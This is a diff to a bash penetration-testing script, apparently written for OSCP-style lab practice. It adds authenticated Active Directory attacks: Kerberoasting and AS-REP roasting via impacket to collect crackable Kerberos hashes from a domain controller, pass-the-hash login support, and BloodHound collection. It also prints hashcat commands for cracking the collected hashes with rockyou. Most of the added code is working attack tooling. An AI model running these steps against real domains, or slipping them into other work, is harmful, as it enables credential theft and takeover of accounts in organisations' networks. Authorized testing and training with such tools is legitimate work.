@@ -33,7 +33,7 @@ skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1 not installed — skipping."; }
 # ---------------------------------------------------------------------------
 # Argument parsing
 # ---------------------------------------------------------------------------
-TARGET=""; OUTPUT_DIR=""; DOMAIN=""; LDAP_USER=""; LDAP_PASS=""
+TARGET=""; OUTPUT_DIR=""; DOMAIN=""; LDAP_USER=""; LDAP_PASS=""; LDAP_HASH=""; LOCAL_AUTH=0
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -42,6 +42,8 @@ while [[ $# -gt 0 ]]; do
         --domain)     DOMAIN="$2";     shift 2 ;;
         --user)       LDAP_USER="$2";  shift 2 ;;
         --pass)       LDAP_PASS="$2";  shift 2 ;;
+        --hash)       LDAP_HASH="$2";  shift 2 ;;
+        --local-auth) LOCAL_AUTH=1;    shift ;;
         *) err "Unknown argument: $1"; exit 1 ;;
     esac
 done
@@ -453,6 +455,106 @@ else
             fi
         fi
     fi
+fi
+
+# ===========================================================================
+# 8 — Authenticated AD hash collection (only with credentials)
+#
+#     Kerberoast and AS-REP roast REQUEST Kerberos tickets (TGS / AS-REP).
+#     A ticket request is NOT a logon attempt, so it never increments the
+#     bad-password count and never locks an account.  We only COLLECT the
+#     crackable hashes here — cracking them with hashcat stays MANUAL, since
+#     that offline step is what turns enumeration into exploitation.
+#     BloodHound collection is pure read-only graph enumeration.
+# ===========================================================================
+if [[ -n "$LDAP_USER" && ( -n "$LDAP_PASS" || -n "$LDAP_HASH" ) ]]; then
+    # Resolve the domain FQDN — from --domain, else rebuilt from the base DN.
+    EFF_DOMAIN="$DOMAIN"
+    if [[ -z "$EFF_DOMAIN" && -f "${LDAP_DIR}/base_dn.txt" ]]; then
+        EFF_DOMAIN=$(grep -oP 'DC=\K[^,]+' "${LDAP_DIR}/base_dn.txt" 2>/dev/null \
+            | paste -sd '.' || true)
+    fi
+
+    if [[ -z "$EFF_DOMAIN" ]]; then
+        warn "[8/8] Authenticated AD attacks need a domain FQDN — none resolved, skipping."
+    else
+        info "[8/8] Authenticated AD hash collection as ${LDAP_USER}@${EFF_DOMAIN}"
+        warn "Kerberos ticket requests only — no logons attempted, no lockout risk."
+
+        # impacket auth token: 'domain/user:pass'  or  'domain/user' + -hashes (PTH)
+        if [[ -n "$LDAP_PASS" ]]; then
+            IMP_AUTH="${EFF_DOMAIN}/${LDAP_USER}:${LDAP_PASS}"
+            IMP_EXTRA=()
+        else
+            IMP_AUTH="${EFF_DOMAIN}/${LDAP_USER}"
+            IMP_EXTRA=( -hashes ":${LDAP_HASH}" )
+        fi
+
+        # -- Kerberoast: request a TGS for every account that has an SPN --
+        GUS=""
+        command -v impacket-GetUserSPNs &>/dev/null && GUS="impacket-GetUserSPNs"
+        [[ -z "$GUS" ]] && command -v GetUserSPNs.py &>/dev/null && GUS="GetUserSPNs.py"
+        if [[ -n "$GUS" ]]; then
+            KROAST="${LDAP_DIR}/kerberoast_hashes.txt"
+            cmd "$GUS ${EFF_DOMAIN}/${LDAP_USER}:<secret> -dc-ip $TARGET -request -outputfile $KROAST"
+            "$GUS" "$IMP_AUTH" "${IMP_EXTRA[@]}" -dc-ip "$TARGET" -request \
+                -outputfile "$KROAST" 2>&1 | tee "${LDAP_DIR}/kerberoast_run.txt" || true
+            if [[ -s "$KROAST" ]]; then
+                KCOUNT=$(grep -c '\$krb5tgs\$' "$KROAST" 2>/dev/null || echo 0)
+                ok "Kerberoast: ${WHITE}${KCOUNT}${NC} TGS hash(es) collected → ${KROAST}"
+                hint "Crack Kerberoast hashes (MANUAL — offline, OSCP-safe):
+    hashcat -m 13100 ${KROAST} /usr/share/wordlists/rockyou.txt \\
+        -r /usr/share/hashcat/rules/best64.rule"
+            fi
+        else
+            skip "impacket-GetUserSPNs"
+        fi
+
+        # -- AS-REP roast: request AS-REP for accounts without Kerberos pre-auth --
+        GNP=""
+        command -v impacket-GetNPUsers &>/dev/null && GNP="impacket-GetNPUsers"
+        [[ -z "$GNP" ]] && command -v GetNPUsers.py &>/dev/null && GNP="GetNPUsers.py"
+        USERLIST="${LDAP_DIR}/ldap_users.txt"
+        if [[ -n "$GNP" && -s "$USERLIST" ]]; then
+            ASREP="${LDAP_DIR}/asrep_hashes.txt"
+            cmd "$GNP ${EFF_DOMAIN}/ -usersfile $USERLIST -no-pass -dc-ip $TARGET -format hashcat"
+            "$GNP" "${EFF_DOMAIN}/" -usersfile "$USERLIST" -no-pass -dc-ip "$TARGET" \
+                -format hashcat -outputfile "$ASREP" \
+                2>&1 | tee "${LDAP_DIR}/asrep_run.txt" || true
+            if [[ -s "$ASREP" ]]; then
+                ACOUNT=$(grep -c '\$krb5asrep\$' "$ASREP" 2>/dev/null || echo 0)
+                ok "AS-REP roast: ${WHITE}${ACOUNT}${NC} hash(es) collected → ${ASREP}"
+                hint "Crack AS-REP hashes (MANUAL — offline, OSCP-safe):
+    hashcat -m 18200 ${ASREP} /usr/share/wordlists/rockyou.txt"
+            fi
+        elif [[ -z "$GNP" ]]; then
+            skip "impacket-GetNPUsers"
+        else
+            info "AS-REP roast skipped — no user list yet (${USERLIST})."
+        fi
+
+        # -- BloodHound collection — read-only AD graph enumeration --
+        if command -v bloodhound-python &>/dev/null; then
+            BH_DIR="${LDAP_DIR}/bloodhound"; mkdir -p "$BH_DIR"
+            if [[ -n "$LDAP_PASS" ]]; then
+                cmd "bloodhound-python -u $LDAP_USER -p <secret> -d $EFF_DOMAIN -ns $TARGET -c All --zip"
+                ( cd "$BH_DIR" && bloodhound-python -u "$LDAP_USER" -p "$LDAP_PASS" \
+                    -d "$EFF_DOMAIN" -ns "$TARGET" -c All --zip ) \
+                    2>&1 | tee "${LDAP_DIR}/bloodhound_run.txt" || true
+            else
+                cmd "bloodhound-python -u $LDAP_USER --hashes :<nt> -d $EFF_DOMAIN -ns $TARGET -c All --zip"
+                ( cd "$BH_DIR" && bloodhound-python -u "$LDAP_USER" --hashes ":${LDAP_HASH}" \
+                    -d "$EFF_DOMAIN" -ns "$TARGET" -c All --zip ) \
+                    2>&1 | tee "${LDAP_DIR}/bloodhound_run.txt" || true
+            fi
+            if ls "$BH_DIR"/*.zip &>/dev/null; then
+                ok "BloodHound data collected → ${BH_DIR}/ (import the .zip into BloodHound GUI)"
+            fi
+        else
+            skip "bloodhound-python"
+        fi
+    fi
+    echo ""
 fi
 
 echo ""
